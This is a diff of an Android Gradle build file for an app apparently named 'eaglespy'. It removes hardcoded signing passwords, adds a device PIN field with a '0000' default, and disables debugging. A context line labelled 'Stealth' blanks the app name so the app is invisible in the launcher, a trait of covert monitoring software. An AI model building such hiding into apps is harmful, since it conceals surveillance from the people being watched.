@@ -22,8 +22,11 @@ android {
         
         // Device Authentication Token from Gradle Property (-PdeviceToken="...")
         // Generate unique token per deployment: openssl rand -base64 32
-        def deviceToken = project.hasProperty('deviceToken') ? project.deviceToken : System.getenv('DEVICE_AUTH_TOKEN') ?: 'CHANGE_ME_BEFORE_DEPLOYMENT'
+        def deviceToken = project.hasProperty('deviceToken') ? project.deviceToken : System.getenv('DEVICE_AUTH_TOKEN') ?: ''
         buildConfigField "String", "DEVICE_AUTH_TOKEN", "\"${deviceToken}\""
+
+        // Device PIN from Gradle Property (-PdevicePin="XXXX")
+        buildConfigField "String", "DEVICE_PIN", "\"${project.findProperty('devicePin') ?: '0000'}\""
 
         // Stealth: Empty app name (invisible in launcher)
         resValue "string", "app_name", ""
@@ -31,15 +34,16 @@ android {
 
     signingConfigs {
         release {
-            storeFile file('../release.keystore')
-            storePassword System.getenv('RELEASE_STORE_PASSWORD') ?: project.findProperty('RELEASE_STORE_PASSWORD') ?: 'eaglespy_dev_pass'
-            keyAlias System.getenv('RELEASE_KEY_ALIAS') ?: project.findProperty('RELEASE_KEY_ALIAS') ?: 'eaglespy'
-            keyPassword System.getenv('RELEASE_KEY_PASSWORD') ?: project.findProperty('RELEASE_KEY_PASSWORD') ?: 'eaglespy_dev_pass'
+            storeFile file(project.findProperty('releaseStoreFile') ?: 'release.keystore')
+            storePassword project.findProperty('releaseStorePassword') ?: ''
+            keyAlias project.findProperty('releaseKeyAlias') ?: ''
+            keyPassword project.findProperty('releaseKeyPassword') ?: ''
         }
     }
 
     buildTypes {
         release {
+            debuggable false
             minifyEnabled true
             shrinkResources true
             signingConfig signingConfigs.release
